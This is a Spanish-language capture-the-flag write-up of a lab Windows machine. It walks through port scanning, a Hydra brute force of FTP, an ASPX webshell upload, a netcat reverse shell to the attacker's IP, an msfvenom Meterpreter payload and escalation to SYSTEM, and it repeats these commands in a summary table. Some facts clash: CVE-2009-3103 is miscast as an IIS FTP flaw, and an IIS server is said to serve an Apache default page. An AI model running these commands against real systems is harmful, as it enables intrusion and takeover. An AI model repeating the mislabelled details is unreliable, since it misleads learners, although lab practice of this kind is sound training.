
# 🔥 **Máquina Cocido Andaluz - Write-Up de Hacking Ético**

> *Resumen detallado de la explotación de una máquina vulnerable en entornos de laboratorio*

---

## 📌 **Introducción**
La **Máquina Cocido Andaluz** es un sistema diseñado para prácticas de hacking ético, enfocado en la explotación de vulnerabilidades comunes en entornos Windows. A través de un proceso estructurado de enumeración, explotación y escalada de privilegios, se logró comprometer completamente el sistema, obteniendo acceso como **SYSTEM** y extrayendo ambas flags: **user.txt** y **root.txt**.

---

## 🚀 **Fase de Reconocimiento y Escaneo de Puertos**

### 🔍 **Comando de Escaneo con Nmap**
Se inició el reconocimiento con un escaneo TCP agresivo para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.151 -oN Escaneo_TCP
```

### 📊 **Resultados del Escaneo**
Se detectaron **12 puertos abiertos**, incluyendo:
- **Puerto 21 (FTP)** → Posible vector de entrada para carga de archivos maliciosos.
- **Puerto 80 (HTTP)** → Servidor web con **Microsoft IIS 7.0** (tecnología ASP.NET).
- **Puertos 135 (MSRPC), 139/445 (SMB)** → Servicios típicos de Windows.
- **Puertos RPC dinámicos (49152–49158)** → Posibles vectores de ataque avanzados.

> 🔴 **Vulnerabilidad crítica detectada**:
> - **CVE-2009-3103 (Microsoft IIS FTP Server Remote Code Execution)** → Permite ejecución remota de comandos (RCE) vía FTP.

---

## 🌐 **Fuzzing Web y Análisis de Directorios**

### 🔎 **Escaneo con Feroxbuster**
Se buscaron rutas ocultas en el servidor web:

```bash
feroxbuster -u http://192.168.1.151 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.html,.txt
```

### 📂 **Directorios Encontrados**
- `/index.html` → Página por defecto de Apache.
- `/aspnet_client/` → Acceso denegado (403).
- `/aspnet_client/system_web/` → Acceso denegado (403).

> ❌ **Resultado**: No se encontraron rutas explotables directamente.

---

## 🔓 **Fuerza Bruta en FTP con Hydra**

### 💥 **Comando de Ataque**
Se realizó fuerza bruta para obtener credenciales FTP:

```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
      -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt \
      ftp://192.168.1.151
```

### 🎯 **Credenciales Obtenidas**
- **Usuario**: `info`
- **Contraseña**: `PolniyPizdec0211`

> ✅ **Acceso FTP exitoso**: Se logró subir archivos maliciosos al servidor.

---

## 💻 **Explotación: Subida y Ejecución de Webshell**

### 📁 **Preparación del Payload**
Se localizó y copió un archivo `.aspx` malicioso (`cmdasp.aspx`):

```bash
find / -name cmdasp.aspx 2>/dev/null
cp /usr/share/webshells/aspx/cmdasp.aspx .
```

### 🚀 **Subida vía FTP**
```bash
put cmdasp.aspx
```

### 🎮 **Ejecución de RCE**
Se accedió a la webshell mediante:
```
http://192.168.1.151/cmdasp.aspx
```

> ✅ **Confirmación de RCE**: Se obtuvo una consola interactiva en el servidor.

---

## 🔐 **Escalada de Privilegios: De Usuario a SYSTEM**

### 📂 **Obtención de la `user.txt`**
Se exploró el sistema y se encontró la flag de usuario:
```bash
dir C:\Users\info
type C:\Users\info\user.txt
```

### 🔄 **Mejora de la Shell: Reverse Shell**
Para mayor estabilidad, se estableció una **reverse shell** mediante SMB:

1. **Compartir `nc.exe` desde Kali**:
   ```bash
   impacket-smbserver webshell . -smb2support
   ```

2. **Ejecución desde la webshell**:
   ```bash
   \\192.168.1.211\webshell\nc.exe -e cmd.exe 192.168.1.211 443
   ```

3. **Escuchar con Netcat**:
   ```bash
   nc -lvnp 443
   ```

> ✅ **Shell interactiva estable**: Se obtuvo una terminal funcional en Windows.

---

## 🛡️ **Post-Explotación: Obtención de Meterpreter**

### 🔧 **Generación de Payload con Msfvenom**
Se creó un ejecutable malicioso para Meterpreter:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.211 LPORT=444 -f exe -o shelly.exe
```

### 📡 **Ejecución y Conexión**
1. **Compartir `shelly.exe` nuevamente**:
   ```bash
   impacket-smbserver payload . -smb2support
   ```

2. **Ejecutar el payload en la víctima**:
   ```bash
   shelly.exe
   ```

3. **Configurar listener en Metasploit**:
   ```bash
   msfconsole
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.211
   set LPORT 444
   exploit
   ```

> ✅ **Sesión Meterpreter activa**: Se confirmó el contexto inicial como `NT AUTHORITY\Servicio de red`.

---

## 🏆 **Escalada Final: Obtención de Privilegios SYSTEM**

### 🚀 **Escalada Automática con `getsystem`**
Dentro de Meterpreter, se ejecutó:
```bash
getsystem
```

> ✅ **Éxito**: Se escaló a **SYSTEM** mediante **Named Pipe Impersonation (EfsPotato)**.

### 📜 **Extracción de la `root.txt`**
Se navegó al escritorio del administrador y se leyó la flag:
```bash
cd C:\Users\Administrator\Desktop
type root.txt
```

> ✅ **Control total del sistema**: Se logró comprometer completamente la máquina.

---

## 📋 **Resumen de Comandos Clave**

| Fase | Comando |
|------|---------|
| **Escaneo TCP** | `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.151 -oN Escaneo_TCP` |
| **Fuerza Bruta FTP** | `hydra -L users.txt -P passwords.txt ftp://192.168.1.151` |
| **Fuzzing Web** | `feroxbuster -u http://192.168.1.151 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.html,.txt` |
| **Reverse Shell** | `\\192.168.1.211\webshell\nc.exe -e cmd.exe 192.168.1.211 443` |
| **Payload Meterpreter** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.211 LPORT=444 -f exe -o shelly.exe` |
| **Escalada a SYSTEM** | `getsystem` |

---
## 🎯 **Conclusión**

La **Máquina Cocido Andaluz** demostró ser un excelente escenario para practicar:
✅ **Enumeración avanzada** de servicios.
✅ **Explotación de vulnerabilidades** en IIS y FTP.
✅ **Escalada de privilegios** mediante técnicas como **EfsPotato**.
✅ **Post-explotación** con Meterpreter y Metasploit.

> 🔥 **Lección aprendida**: La combinación de **fuerza bruta, RCE y escalada automática** puede comprometer sistemas incluso con configuraciones por defecto.
